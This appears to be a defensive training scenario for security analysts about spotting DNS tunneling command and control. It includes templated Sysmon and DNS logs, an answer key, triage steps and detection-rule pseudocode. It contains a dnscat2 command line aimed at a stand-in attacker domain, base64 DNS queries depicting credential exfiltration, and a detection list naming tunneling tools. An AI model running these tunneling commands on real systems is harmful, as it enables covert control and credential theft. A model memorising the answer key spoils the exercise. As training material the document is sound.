# Command and Control: DNS Tunneling — Level 5

> **Category:** Command and Control (C2)
> **Subcategory:** Application Layer Protocol: DNS (DNS Tunneling)
> **Difficulty:** Level 5 (Pattern Recognition)
> **Events:** 4

---

## Scenario Description

A Sysmon alert shows a known DNS tunneling tool launching from a user's Temp directory with command-line arguments pointing to an unfamiliar domain. Shortly after, the DNS server logs three consecutive TXT record queries to that same domain — but the subdomain portions are unusually long strings of random-looking characters that change with every query. Review the Sysmon and DNS logs and determine if these events represent a DNS tunneling channel being used for command and control communication.

---

## Attack Pattern Reference

| Framework | ID | Name | Link |
|-----------|-----|------|------|
| MITRE ATT&CK | **T1071.004** | Application Layer Protocol: DNS | [attack.mitre.org](https://attack.mitre.org/techniques/T1071/004/) |
| MITRE ATT&CK | **T1572** | Protocol Tunneling | [attack.mitre.org](https://attack.mitre.org/techniques/T1572/) |
| ATT&CK Tactic | **TA0011** | Command and Control | |

> **Note:** T1071.004 is the primary technique — MITRE describes it as "often known as DNS tunneling" where adversaries embed C2 commands and data within DNS queries and responses. T1572 covers the tunneling mechanism itself — encapsulating non-DNS data within the DNS protocol to bypass security controls. MITRE links them directly: "A DNS beacon is created by tunneling DNS traffic (i.e. Protocol Tunneling)." Real-world usage includes SUNBURST (SolarWinds), APT34/OilRig (DNSpionage), DarkHydrus, xHunt, DNSMessenger, and tools like dnscat2, iodine, and Cobalt Strike's DNS beacon.

---

## Log Events

### Event 1 of 4 — DNS Tunneling Tool Launches from Temp Directory

#### Table View

| TIME | EVENT TYPE | SOURCE TYPE | SOURCE IP | DEST IP | MESSAGE |
|------|------------|-------------|-----------|---------|---------|
| {timestamp_1} | ProcessCreate | Sysmon | {src_ip} | — | Process created: dnscat2.exe by {user_domain}. |

#### Key Value Pairs

```
timestamp = {timestamp_1}
event_type = ProcessCreate
source_type = Sysmon
host = {hostname}
src_ip = {src_ip}
commandline = dnscat2.exe --dns domain=cloudmetrics-sync.net --secret=5a8f3e
process_id = 17892
message = Process created: dnscat2.exe by {user_domain}.
```

---

### Event 2 of 4 — First Encoded DNS Query

#### Table View

| TIME | EVENT TYPE | SOURCE TYPE | SOURCE IP | DEST IP | MESSAGE |
|------|------------|-------------|-----------|---------|---------|
| {timestamp_2} | QUERY_RECEIVED | DNS | {src_ip} | — | DNS query received for dGhpcyBpcyBhIHRlc3Q.data.cloudmetrics-sync.net. |

#### Key Value Pairs

```
timestamp = {timestamp_2}
event_type = QUERY_RECEIVED
source_type = DNS
host = ACME-SVR03
src_ip = {src_ip}
client_ip = {src_ip}
qname = dGhpcyBpcyBhIHRlc3Q.data.cloudmetrics-sync.net
qtype = TXT
src_port = 54102
message = DNS query received for dGhpcyBpcyBhIHRlc3Q.data.cloudmetrics-sync.net.
```

---

### Event 3 of 4 — Second Encoded DNS Query

#### Table View

| TIME | EVENT TYPE | SOURCE TYPE | SOURCE IP | DEST IP | MESSAGE |
|------|------------|-------------|-----------|---------|---------|
| {timestamp_3} | QUERY_RECEIVED | DNS | {src_ip} | — | DNS query received for c2VuZGluZyBjcmVkcw.data.cloudmetrics-sync.net. |

#### Key Value Pairs

```
timestamp = {timestamp_3}
event_type = QUERY_RECEIVED
source_type = DNS
host = ACME-SVR03
src_ip = {src_ip}
client_ip = {src_ip}
qname = c2VuZGluZyBjcmVkcw.data.cloudmetrics-sync.net
qtype = TXT
src_port = 54103
message = DNS query received for c2VuZGluZyBjcmVkcw.data.cloudmetrics-sync.net.
```

---

### Event 4 of 4 — Third Encoded DNS Query

#### Table View

| TIME | EVENT TYPE | SOURCE TYPE | SOURCE IP | DEST IP | MESSAGE |
|------|------------|-------------|-----------|---------|---------|
| {timestamp_4} | QUERY_RECEIVED | DNS | {src_ip} | — | DNS query received for ZXh0cmFjdCBjb21wbGV0ZQ.data.cloudmetrics-sync.net. |

#### Key Value Pairs

```
timestamp = {timestamp_4}
event_type = QUERY_RECEIVED
source_type = DNS
host = ACME-SVR03
src_ip = {src_ip}
client_ip = {src_ip}
qname = ZXh0cmFjdCBjb21wbGV0ZQ.data.cloudmetrics-sync.net
qtype = TXT
src_port = 54104
message = DNS query received for ZXh0cmFjdCBjb21wbGV0ZQ.data.cloudmetrics-sync.net.
```

---

## Expected Answer

**Classification:** Malicious — Command and Control via DNS Tunneling

**Threat Category:** DNS Tunneling (Application Layer Protocol: DNS)

---

## Triage Review

### What is it?

**DNS Tunneling** is a technique where an attacker hides command and control communication — and sometimes data exfiltration — inside DNS queries. Instead of connecting to a suspicious server over HTTPS (which a proxy or firewall might catch), the malware encodes data into DNS subdomain queries that route through normal DNS infrastructure to an attacker-controlled DNS server.

DNS is the "phone directory" of the internet. Every time a computer needs to visit a website, connect to a service, or resolve a hostname, it sends a DNS query. This happens thousands of times per day on every workstation. Because DNS is so fundamental, it's almost never blocked, rarely inspected, and most security tools treat it as background noise.

Attackers exploit this by turning DNS into a covert communication channel:

1. The malware encodes data (stolen credentials, commands, file contents) into base64
2. It puts the encoded data as a subdomain: `dGhpcyBpcyBhIHRlc3Q.data.cloudmetrics-sync.net`
3. The query routes through the company's internal DNS server → ISP DNS → eventually to the attacker's authoritative DNS server for `cloudmetrics-sync.net`
4. The attacker's server decodes the subdomain, reads the data, and puts commands into the DNS response
5. The malware reads the response and executes the commands

All of this happens over port 53 (standard DNS) through legitimate DNS infrastructure. No direct connection to a suspicious IP. No HTTPS traffic to block. No firewall rules to bypass.

| Indicator | What It Means | Why It's Suspicious |
|-----------|---------------|---------------------|
| **`dnscat2.exe` in `AppData\Local\Temp\`** | Known DNS tunneling tool on the workstation | dnscat2 is a well-documented C2-over-DNS tool — its presence alone confirms an active attack |
| **`--dns domain=cloudmetrics-sync.net`** | Command line specifies the tunneling domain | The attacker registered this domain and configured its DNS server to process encoded queries |
| **`--secret=5a8f3e`** | Encryption key for the tunnel | Encrypts the tunneled data so even if someone inspects the DNS queries, the content is unreadable |
| **Long base64 subdomains** | Encoded data in DNS query name | Normal subdomains are readable words (www, mail, login), not random character strings like `dGhpcyBpcyBhIHRlc3Q` |
| **`TXT` query type** | Requests text records | TXT records allow the largest responses — ideal for tunneling data back from the attacker's server |
| **Same base domain repeated** | All 3 queries go to `cloudmetrics-sync.net` | Normal browsing hits hundreds of different domains — repeated queries to one domain is a communication channel |
| **Regular timing intervals** | ~30-60 seconds between queries | Beaconing pattern — the malware checks in at regular intervals for new commands |
| **`data.` subdomain prefix** | Labels the tunnel channel | Consistent across all queries — dnscat2 uses subdomains to organize tunnel sessions |

### Understanding the DNS Tunneling Chain

```
PRIOR (not visible in these logs):
  Malware delivered via phishing, trojan, or exploit
  Attacker registered cloudmetrics-sync.net and set up DNS server
       │
       ▼
EVENT 1: dnscat2 launches ({timestamp_1})
   │
   ├── dnscat2.exe starts from AppData\Local\Temp\
   ├── Command line specifies domain and encryption key
   └── Tunnel initialization begins
          │
          EVENT 2: First beacon query (~1-2 minutes later)
          │
          ├── TXT query with base64-encoded data as subdomain
          ├── "dGhpcyBpcyBhIHRlc3Q" decodes to "this is a test"
          └── Initial handshake — malware confirming tunnel is active
               │
               EVENT 3: Second beacon query (~30-60s later)
               │
               ├── "c2VuZGluZyBjcmVkcw" decodes to "sending creds"
               └── Malware is now exfiltrating stolen credentials
                    │
                    EVENT 4: Third beacon query (~30-60s later)
                    │
                    ├── "ZXh0cmFjdCBjb21wbGV0ZQ" decodes to "extract complete"
                    └── Exfiltration finished — attacker has the data
                         │
                         RESULT: Credentials exfiltrated over DNS
                         without triggering any firewall, proxy,
                         or network security alerts
```

### Why DNS Tunneling Bypasses Most Security

DNS tunneling is effective because it exploits a fundamental trust assumption in network security:

| Security Control | Why It Misses DNS Tunneling |
|------------------|---------------------------|
| **Firewall** | Port 53 (DNS) is allowed outbound on virtually every network — blocking it breaks name resolution |
| **Proxy** | DNS queries don't go through the web proxy — they go directly to the DNS server |
| **IDS/IPS** | Most signatures focus on HTTP/HTTPS traffic, not DNS payload inspection |
| **DLP (Data Loss Prevention)** | DLP monitors file uploads and email attachments — not base64 strings in DNS subdomains |
| **Network monitoring** | DNS traffic volume is so high that anomalous queries blend into the noise |
| **Endpoint protection** | dnscat2 doesn't create network connections to suspicious IPs — it just makes DNS queries like every other process |

### What the Base64 Subdomains Actually Contain

The encoded subdomains in this scenario decode to real messages:

| Encoded Subdomain | Decoded Content | What It Means |
|-------------------|----------------|---------------|
| `dGhpcyBpcyBhIHRlc3Q` | this is a test | Initial handshake — tunnel is working |
| `c2VuZGluZyBjcmVkcw` | sending creds | Malware is exfiltrating stolen credentials |
| `ZXh0cmFjdCBjb21wbGV0ZQ` | extract complete | Exfiltration is done — attacker has the data |

In a real attack, the base64 content would be encrypted (that's what the `--secret` flag is for), so a defender couldn't just decode and read it. But the encoding pattern itself — long random-looking strings as subdomains — is the detection indicator.

### How DNS Tunneling Compares to Level 2 C2 (HTTPS Beaconing)

Level 2 taught the player to recognize C2 communication over HTTPS. Level 5 requires understanding a covert channel that bypasses the controls that catch HTTPS beaconing.

| Factor | HTTPS C2 Beaconing (Level 2) | DNS Tunneling (This Scenario) |
|--------|------------------------------|-------------------------------|
| **Protocol** | HTTPS (port 443) | DNS (port 53) |
| **Visible in proxy logs?** | Yes — proxy sees the CONNECT tunnel | No — DNS queries bypass the proxy entirely |
| **Blocked by firewall?** | Can be — block the destination IP | Almost never — blocking DNS breaks everything |
| **Detection method** | Suspicious domain + no user session + regular intervals | Long encoded subdomains + TXT queries + same domain repeated |
| **Data capacity** | High — HTTPS can transfer large files | Low — DNS can only carry small amounts per query |
| **Stealth level** | Medium — shows up in proxy and firewall logs | High — hidden in normal DNS traffic |
| **MITRE technique** | T1071.001 (Web Protocols) | T1071.004 (DNS) |
| **Tools** | Cobalt Strike HTTPS beacon, Metasploit | dnscat2, iodine, dns2tcp, Cobalt Strike DNS beacon |

---

## Recommended Triage Steps

### 1. IMMEDIATE — Isolate the Host
Pull the affected workstation off the network. The DNS tunnel is an active C2 channel — the attacker can send commands in real time. Every second connected is another command the attacker can execute.

### 2. Kill the Process
Terminate `dnscat2.exe` (PID 17892) on the host. This severs the C2 channel immediately. Preserve the binary for analysis before deleting it.

### 3. Identify the Scope
Search the SIEM for other hosts showing the same indicators:
- Any other DNS queries to `cloudmetrics-sync.net` from any host
- Any other TXT queries with unusually long subdomain strings
- Any other hosts with `dnscat2.exe` or similar tools in Temp directories
- Check if the attacker moved laterally before you cut the tunnel

### 4. Block the Domain
Block `cloudmetrics-sync.net` and `*.cloudmetrics-sync.net` at the DNS server level. Add it to the domain blocklist. This prevents any other infected hosts from reaching the attacker's C2 server.

### 5. Trace the Delivery Method
Work backwards — how did `dnscat2.exe` get into Temp?
- Check Sysmon FileCreate for when `dnscat2.exe` was written to Temp
- Check Proxy logs for recent downloads to this workstation
- Check email logs if phishing is suspected
- Check PowerShell logs for download cradles

### 6. Assess the Damage
The base64 subdomains suggest credential exfiltration. Assume compromised:
- Which credentials were accessible from this workstation?
- Were any service accounts or admin credentials cached?
- Reset passwords for the affected user and any accounts they had access to
- Check for unauthorized access using the stolen credentials

### 7. Implement DNS Monitoring
This attack succeeded because DNS traffic wasn't being inspected. Recommend:
- Deploy DNS query logging (Sysmon Event ID 22) on all endpoints
- Implement DNS security analytics to detect high-entropy subdomains
- Monitor for TXT query spikes from individual hosts
- Consider DNS filtering solutions that detect tunneling patterns

### 8. Escalate
DNS tunneling with credential exfiltration is a confirmed breach. Escalate to incident response team, notify management, and initiate credential rotation. The attacker had an active C2 channel — assume they accomplished their objective.

---

## Generation Rules

| Variable | Rule |
|----------|------|
| {src_ip} | Same across all 4 events — same compromised host |
| {hostname} | Same across all 4 events — same compromised host |
| {username} | Same across all 4 events |
| {user_domain} | ACME\\{username} |
| process_id | 17892 across Event 1 (Sysmon only — DNS logs don't include PID) |
| DNS host | ACME-SVR03 across all 3 DNS events — DNS server perspective |
| Base domain | cloudmetrics-sync.net — same across all DNS events |
| Subdomain prefix | data. — tunnel channel identifier |
| Encoded subdomains | Different base64 string each query — different data being sent |
| {timestamp_1} → {timestamp_2} | ~1-2 minute gap (process starts, initializes tunnel) |
| {timestamp_2} → {timestamp_3} | ~30-60 second gap (beacon interval) |
| {timestamp_3} → {timestamp_4} | ~30-60 second gap (beacon interval) |
| Timestamps | Any time — DNS tunneling runs continuously once established |

---

## What the Player Should Recognize

| Indicator | Evidence |
|-----------|----------|
| Known attack tool | `dnscat2.exe` is a well-documented DNS tunneling C2 tool |
| Tool in wrong location | Running from `AppData\Local\Temp\` — not a legitimate install path |
| Command line reveals intent | `--dns domain=` specifies the C2 domain, `--secret=` specifies encryption |
| Long encoded subdomains | `dGhpcyBpcyBhIHRlc3Q` is 20+ characters of random-looking text — not a real hostname |
| TXT query type | TXT records are unusual for normal browsing — commonly used in DNS tunneling for larger response payloads |
| Same domain repeated | All 3 DNS queries go to `cloudmetrics-sync.net` — this is a communication channel, not normal browsing |
| Regular intervals | ~30-60 seconds between queries = beaconing pattern |
| Base64 character set | Mixed case letters and numbers, no spaces or readable words — characteristic of encoded data |
| `data.` subdomain prefix | Labels the tunnel channel — consistent across all queries |
| Cross-source correlation | Sysmon shows the process, DNS shows the network behavior — together they confirm the attack |

### The Level 5 Difficulty Factor

Level 5 requires the player to recognize a **covert C2 channel hidden within a trusted protocol** and correlate across two different log sources:

| Stage | What the Player Must Recognize | Difficulty |
|-------|-------------------------------|------------|
| **1. Tool Recognition** | `dnscat2.exe` is a known attack tool — requires familiarity with common red team and tunneling tools | Medium |
| **2. DNS as Attack Vector** | DNS is typically ignored as background noise — the player must understand that DNS can be weaponized as a C2 channel | High |
| **3. Subdomain Anomaly Detection** | The player must recognize that long, random-looking subdomains are abnormal — requires comparing against what normal DNS queries look like | High |
| **4. TXT Record Significance** | Normal browsing uses A/AAAA records — TXT queries from a workstation process are unusual and indicate data transfer | Medium |
| **5. Cross-Source Correlation** | Linking a Sysmon event (process) to DNS events (network behavior) across two different log sources to build the complete picture | High |

---

## Level Progression Preview

| Level | Events | Complexity |
|-------|--------|------------|
| **Level 2** (HTTPS Beaconing) | 2 | DNS resolution + Proxy callback — suspicious domain with no user session |
| **Level 5** (Current) | 4 | DNS tunneling — covert channel hidden in DNS protocol, requires understanding of DNS abuse + tool recognition + cross-source correlation |
| **Level 7+** (Future) | 5-6 | DNS-over-HTTPS tunneling, domain fronting, or C2 through legitimate cloud services (Slack, GitHub) |

---

## Related Log Sources

Additional logs that would appear in a real environment during this attack:

| Log Source | Event Type | What It Shows |
|------------|------------|---------------|
| **Sysmon Event 1** | ProcessCreate | dnscat2.exe launching from Temp (this scenario) |
| **Sysmon Event 22** | DNSQuery | Process-level DNS queries — ties the DNS queries directly to dnscat2.exe's PID |
| **Sysmon Event 11** | FileCreate | How dnscat2.exe was dropped to Temp (download, extraction from archive) |
| **Sysmon Event 3** | NetworkConnection | dnscat2.exe connecting to the internal DNS server on port 53 |
| **Firewall ALLOW** | UDP/53 outbound | DNS traffic from {src_ip} — volume would be abnormally high for a tunneling session |
| **Proxy** | No entries | That's the point — DNS tunneling bypasses the proxy entirely |
| **DNS Server Logs** | RECURSE_QUERY_OUT | Internal DNS server forwarding queries to cloudmetrics-sync.net's authoritative nameserver |
| **Windows Security 4688** | Process Created | Corroborating process creation for dnscat2.exe |

---

## Detection Rule Logic (Reference)

```
# Detect DNS queries with abnormally long subdomains
MATCH dns_logs WHERE
  event_type = "QUERY_RECEIVED"
  AND LENGTH(qname) > 50
  AND qname MATCHES "[A-Za-z0-9+/=]{20,}"

# Detect high volume of TXT queries to a single domain
MATCH dns_logs WHERE
  event_type = "QUERY_RECEIVED"
  AND qtype = "TXT"
  GROUP BY base_domain
  HAVING COUNT(*) >= 10 WITHIN 600 SECONDS

# Detect repeated queries to same domain with varying subdomains
MATCH dns_logs WHERE
  event_type = "QUERY_RECEIVED"
  GROUP BY base_domain, src_ip
  HAVING COUNT(DISTINCT qname) >= 5
  AND COUNT(DISTINCT subdomain) >= 5
  WITHIN 300 SECONDS

# Detect known DNS tunneling tools
MATCH sysmon_logs WHERE
  event_type = "ProcessCreate"
  AND (
    commandline MATCHES "*dnscat*" OR
    commandline MATCHES "*iodine*" OR
    commandline MATCHES "*dns2tcp*" OR
    commandline MATCHES "*dnsexfiltrator*"
  )

# High entropy subdomain detection
MATCH dns_logs WHERE
  event_type = "QUERY_RECEIVED"
  AND ENTROPY(subdomain) > 3.5
  AND LENGTH(subdomain) > 20

# Correlation: Process + DNS tunnel
MATCH sysmon_logs AS process
  JOIN dns_logs AS query
    ON process.src_ip = query.src_ip
    AND query.event_type = "QUERY_RECEIVED"
    AND query.qtype = "TXT"
    AND LENGTH(query.qname) > 50
    AND query.timestamp BETWEEN process.timestamp AND process.timestamp + 300s
WHERE
  process.event_type = "ProcessCreate"
  AND process.commandline MATCHES "*--dns*domain=*"
```

---

## Common False Positives

Understanding legitimate scenarios helps avoid alert fatigue:

| False Positive Scenario | How to Identify |
|-------------------------|-----------------|
| DKIM/SPF email authentication records | TXT queries for `_dmarc.domain.com` or `_spf.domain.com` — predictable format with standard prefixes, not random strings |
| Microsoft Office license validation | TXT queries for `_vlmcs._tcp.domain.com` — known pattern, short subdomain |
| Let's Encrypt certificate validation | TXT queries for `_acme-challenge.domain.com` — known prefix, single query not repeated beacon |
| DNS-based service discovery | SRV/TXT queries for `_sip._tcp` or similar — standardized prefixes, not base64 encoded |
| Anti-spam DNSBL lookups | Queries to known blocklist domains like `zen.spamhaus.org` — IP-based subdomains, not encoded data |
| Security vendor cloud lookups | Some antivirus products use DNS TXT queries for reputation checks — known vendor domains, consistent patterns |

**Key Differentiators:**
- DNS Tunneling: Long base64 subdomains, TXT queries, same domain repeated at regular intervals, high entropy, unknown process source, tool like dnscat2
- Legitimate: Short readable subdomains, known query patterns, standard prefixes (_dmarc, _spf, _acme), single or infrequent queries, known application making the query

---

## Known DNS Tunneling Tools

| Tool | Type | Detection Indicator |
|------|------|---------------------|
| **dnscat2** (this scenario) | C2-over-DNS tool | `--dns domain=` in command line, CNAME/TXT records, encoded subdomains |
| **iodine** | Full IPv4 tunnel over DNS | NULL record queries, requires TAP driver, creates network interface |
| **dns2tcp** | TCP-over-DNS tunnel | TXT records, encodes TCP sessions into DNS queries |
| **DNSExfiltrator** | Data exfiltration tool | Large volume of TXT queries with base64 encoded data |
| **NSTX** | IP-over-DNS tunnel (Linux only) | High query volume, older tool |
| **Cobalt Strike DNS Beacon** | Commercial red team tool | Configurable — can use A, AAAA, or TXT records with custom domains |

---

## Real-World Threat Actors Using DNS Tunneling

| Campaign / Actor | Context |
|-----------------|---------|
| **SUNBURST** (SolarWinds, 2020) | Encoded victim information into subdomain queries to attacker-controlled nameservers — one of the most significant supply chain attacks in history |
| **APT34 / OilRig (DNSpionage, 2018)** | Iranian state-sponsored group used DNS tunneling for cyber-espionage against government and energy targets |
| **DarkHydrus** | Used DNS tunneling for C2 communication in targeted espionage campaigns |
| **xHunt** | Deployed "Hisoka" and "Kuwa" tools using DNS tunneling for data exfiltration and C2 |
| **DNSMessenger** (2017) | PowerShell-based fileless backdoor that used DNS TXT records — never wrote to disk |
| **Decoy Dog** (2023) | Delivered staged malware through DNS tunneling — discovered by Infoblox researchers |
| **Feederbot / Morto** (2011) | Early malware families using DNS TXT records for command and control |

---

## DNS Record Types Used in Tunneling

| Record Type | Normal Use | Why Attackers Use It |
|-------------|-----------|---------------------|
| **TXT** (this scenario) | Email authentication (SPF, DKIM), domain verification | Largest response size — up to 255 chars per string, multiple strings allowed |
| **CNAME** | Domain aliasing (www → actual server) | Moderate response size, less suspicious than TXT |
| **A** | IPv4 address resolution | Small response (4 bytes) but extremely common, hard to filter |
| **AAAA** | IPv6 address resolution | Larger than A (16 bytes), still common |
| **MX** | Mail server records | Moderate response size, less common queries stand out |
| **NULL** | No standard use | Maximum payload capacity but extremely rare — easy to detect |

---

## Process Chain Analysis

### Suspicious Chain (This Scenario)
```
[{hostname}] Attacker gained access (phishing, exploit, etc.)
  └── dnscat2.exe --dns domain=cloudmetrics-sync.net --secret=5a8f3e
      │   (DNS TUNNELING TOOL — from Temp, encrypted tunnel)
      │
      ├── DNS TXT: dGhpcyBpcyBhIHRlc3Q.data.cloudmetrics-sync.net
      │             → decodes to: "this is a test" (HANDSHAKE)
      │
      ├── DNS TXT: c2VuZGluZyBjcmVkcw.data.cloudmetrics-sync.net
      │             → decodes to: "sending creds" (EXFILTRATION)
      │
      └── DNS TXT: ZXh0cmFjdCBjb21wbGV0ZQ.data.cloudmetrics-sync.net
                    → decodes to: "extract complete" (DONE)
                    │
                    └── All data routed through internal DNS → attacker's DNS server
                        C2 channel active, credentials exfiltrated,
                        no direct connection to attacker IP
```
**Why Suspicious:** Known tunneling tool in Temp, encrypted tunnel parameters in command line, base64 encoded subdomains, TXT record queries, same domain repeated at regular intervals

### Legitimate Chain (Normal DNS Activity)
```
[{hostname}] chrome.exe (user browsing)
  ├── DNS A: www.google.com → 142.250.191.46
  ├── DNS A: outlook.office365.com → 52.96.166.24
  └── DNS AAAA: teams.microsoft.com → 2607:f8b0:4004:800::2004
      └── Short readable subdomains, A/AAAA records,
          different domains for each query, tied to user browsing
```
**Why Legitimate:** Known browser process, short readable subdomains, A/AAAA record types (not TXT), different domains for each query, matches normal browsing activity

---

*Last Updated: February 2026*
*Spectyr Training Platform*
